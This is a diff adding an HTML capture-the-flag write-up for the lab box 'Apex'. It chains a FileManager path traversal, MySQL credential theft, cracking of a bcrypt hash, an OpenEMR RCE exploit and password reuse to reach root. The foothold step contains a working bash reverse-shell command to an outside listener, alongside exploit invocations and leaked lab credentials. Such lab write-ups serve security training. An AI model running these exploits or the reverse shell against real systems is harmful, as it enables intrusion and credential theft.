@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Apex &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Apex</h1>
+    <div class="meta">Target: <code>192.168.206.145</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">FileManager</span><span class="tag">PathTraversal</span><span class="tag">CVE</span><span class="tag">OpenEMR</span><span class="tag">SMB</span><span class="tag">MySQL</span><span class="tag">john</span><span class="tag">PasswordReuse</span><span class="tag">RCE</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#web-enumeration">Web Enumeration</a><a class="lvl3" href="#smb-enumeration">SMB Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#responsive-filemanager-path-traversal-edb-49359">Responsive FileManager Path Traversal (EDB-49359)</a><a class="lvl3" href="#mysql-admin-hash-shell">MySQL → Admin Hash → Shell</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#password-reuse-root">Password Reuse → root</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Apex is a Proving Grounds Linux box running OpenEMR behind an Apache web server, with a file manager and SMB share also exposed. A path traversal in Responsive FileManager 9.13.4 reads arbitrary files from the server. That vulnerability retrieves the OpenEMR MySQL configuration, which yields database credentials. Querying the database recovers the admin's bcrypt hash, john cracks it, and authenticated RCE in OpenEMR 5.0.1 gives a shell as <code>www-data</code>. The OpenEMR admin password is also the root system password.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE     VERSION
+80/tcp   open  http        Apache httpd 2.4.29 (Ubuntu)
+|_http-title: APEX Hospital
+445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu
+3306/tcp open  mysql       MySQL 5.5.5-10.1.48-MariaDB
+</code></pre>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>Gobuster against port 80 finds a file manager:</p>
+<pre><code class="language-sh">gobuster dir -u http://192.168.206.145/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt -x php
+
+/filemanager  (Status: 301) [--&gt; http://192.168.206.145/filemanager/]
+/source       (Status: 301)
+</code></pre>
+<p>The file manager identifies as <strong>Responsive FileManager v.9.13.4</strong>.</p>
+<h3 id="smb-enumeration">SMB Enumeration</h3>
+<p>The <code>docs</code> share on SMB is accessible without credentials and contains OpenEMR PDF marketing materials, confirming OpenEMR is installed.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="responsive-filemanager-path-traversal-edb-49359">Responsive FileManager Path Traversal (EDB-49359)</h3>
+<p>The exploit requires a valid <code>PHPSESSID</code> cookie, obtained by loading the page in a browser and intercepting the request in Burp:</p>
+<pre><code class="language-sh">python3 exploit.py http://192.168.206.145/ PHPSESSID=skd8uiolmtgu759iakar7nkt7e /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+...
+white:x:1000:1000::/home/white:/bin/sh
+</code></pre>
+<blockquote>
+<p><strong>What the traversal does:</strong> the exploit writes the target file path into the clipboard buffer via the <code>path</code> parameter, then pastes it into the filemanager's current directory listing. The filemanager follows the path without sanitising <code>../</code> sequences, placing arbitrary files into the output directory. Setting <code>path=/Documents</code> sends the output to the SMB-accessible <code>docs</code> share.</p>
+</blockquote>
+<p>The OpenEMR database config is at <code>/var/www/openemr/sites/default/sqlconf.php</code>. Redirect the exploit output to the SMB share:</p>
+<pre><code class="language-python">url_paste, data=&quot;path=/Documents&quot;, headers=headers
+</code></pre>
+<pre><code class="language-sh">python3 exploit.py http://192.168.206.145/ PHPSESSID=skd8uiolmtgu759iakar7nkt7e /var/www/openemr/sites/default/sqlconf.php
+</code></pre>
+<p>Retrieve the config via SMB:</p>
+<pre><code class="language-sh">smbclient '//192.168.206.145\docs'
+smb: \&gt; mget sqlconf.php
+</code></pre>
+<p>Config contents:</p>
+<pre><code class="language-php">$login  = 'openemr';
+$pass   = 'C78maEQUIEuQ';
+$dbase  = 'openemr';
+</code></pre>
+<h3 id="mysql-admin-hash-shell">MySQL → Admin Hash → Shell</h3>
+<p>Connect to MySQL with the recovered credentials:</p>
+<pre><code class="language-sh">mysql -u openemr -pC78maEQUIEuQ -h 192.168.206.145 -A
+</code></pre>
+<p>Query the users table:</p>
+<pre><code class="language-sql">use openemr;
+select username, password from users_secure;
++----------+--------------------------------------------------------------+
+| username | password                                                     |
++----------+--------------------------------------------------------------+
+| admin    | $2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC |
++----------+--------------------------------------------------------------+
+</code></pre>
+<p>Crack the bcrypt hash:</p>
+<pre><code class="language-sh">john hash --wordlist=/usr/share/wordlists/rockyou.txt
+‹redacted›        (?)
+</code></pre>
+<p>Credentials:</p>
+<pre><code>admin : ‹redacted›
+</code></pre>
+<p>OpenEMR is at <code>/openemr</code>, which redirects to the login panel. Log in and confirm the version:</p>
+<pre><code>Version Number: v5.0.1 (1)
+</code></pre>
+<p>OpenEMR 5.0.1 has an authenticated RCE exploit (EDB-45161). Run it with a bash reverse shell payload:</p>
+<pre><code class="language-sh">python2 openemr.py http://192.168.206.145/openemr -u admin -p ‹redacted› -c 'bash -i &gt;&amp; /dev/tcp/192.168.45.167/445 0&gt;&amp;1'
+[$] Authenticating with admin:‹redacted›
+[$] Injecting payload
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 445
+www-data@APEX:/var/www/openemr/interface/main$ whoami
+www-data
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="password-reuse-root">Password Reuse → root</h3>
+<p>The OpenEMR admin password reuses as the system root password:</p>
+<pre><code class="language-sh">www-data@APEX:/var/www/openemr/interface/main$ su root
+Password: ‹redacted›
+root@APEX:/var/www/openemr/interface/main# whoami
+root
+</code></pre>
+<blockquote>
+<p><strong>Why this matters beyond the box:</strong> password reuse between application credentials and system accounts is a realistic finding. Database config files, CMS admin hashes, and application passwords are all worth trying against <code>su</code>, <code>sudo</code>, and SSH when you have a shell.</p>
+</blockquote>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">root@APEX:~# cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>File manager CVEs that write files to accessible directories turn arbitrary read into exfiltration.</strong> The SMB share as an output directory made retrieval trivial without a direct HTTP response.</li>
+<li><strong>Database config files in CMS installations reliably contain credentials.</strong> <code>sqlconf.php</code> is the first file to grab after confirming OpenEMR is running.</li>
+<li><strong>Crack every hash you find.</strong> The <code>users_secure</code> table gave the admin bcrypt in one query; john handled it in under 10 seconds.</li>
+<li><strong>Application admin passwords commonly reuse as system passwords.</strong> Always try recovered credentials against <code>su</code> and <code>sudo</code>.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
